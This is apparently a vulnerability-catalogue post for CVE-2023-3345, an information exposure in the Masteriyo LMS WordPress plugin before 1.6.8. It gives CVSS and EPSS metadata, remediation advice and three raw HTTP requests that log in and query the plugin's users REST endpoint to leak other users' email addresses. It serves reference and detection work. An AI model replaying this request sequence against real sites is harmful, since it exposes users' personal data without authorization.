---
layout: "post"
cve_id: "CVE-2023-3345"
title: "LMS by Masteriyo < 1.6.8 - Information Exposure"
pcap: true
pcap_path: "/pcaps/2023/CVE-2023-3345.pcap"
nuclei_url: "https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2023/CVE-2023-3345.yaml"
author: "DhiyaneshDK"
severity: "medium"
impact: "An attacker can gain unauthorized access to sensitive information.
"
remediation: "Upgrade LMS by Masteriyo to version 1.6.8 or higher to fix the vulnerability.
"
reference:
  - "https://wpscan.com/vulnerability/0d07423e-98d2-43a3-824d-562747a3d65a"
  - "https://github.com/RandomRobbieBF/learning-management-system"
  - "https://wordpress.org/plugins/learning-management-system"
  - "https://nvd.nist.gov/vuln/detail/CVE-2023-3345"
classification: "{'cvss-metrics': 'CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N', 'cvss-score': 6.5, 'cve-id': 'CVE-2023-3345', 'cwe-id': 'CWE-200', 'epss-score': 0.64843, 'epss-percentile': 0.98397, 'cpe': 'cpe:2.3:a:masteriyo:masteriyo:*:*:*:*:*:wordpress:*:*'}"
metadata: "{'verified': True, 'max-request': 3, 'vendor': 'masteriyo', 'product': 'masteriyo', 'framework': 'wordpress'}"
tags:
  - "cve2023"
  - "cve"
  - "wp-plugin"
  - "wp"
  - "wordpress"
  - "exposure"
  - "authenticated"
  - "learning-management-system"
  - "wpscan"
  - "masteriyo"
  - "vuln"
snort2_rule: |
  N/A
snort3_rule: |
  N/A
---

## ðŸ” Vulnerability Description
The plugin does not properly safeguards sensitive user information, like other user's email addresses, making it possible for any students to leak them via some of the plugin's REST API endpoints.


## ðŸŒ HTTP Request
```nohighlight
POST /wp-login.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; WebView/3.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763
Connection: close
Content-Length: 51
Content-Type: application/x-www-form-urlencoded
Origin: /
Accept-Encoding: gzip

log=n6iONM&pwd=yQAhnn&wp-submit=Log+In&testcookie=1
```

```nohighlight
GET /wp-admin/profile.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (CentOS; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
Connection: close
Accept-Encoding: gzip
```

```nohighlight
GET /wp-json/masteriyo/v1/users/ HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1.2 Safari/605.1.15
Connection: close
X-WP-Nonce: WPSBJc
Accept-Encoding: gzip
```

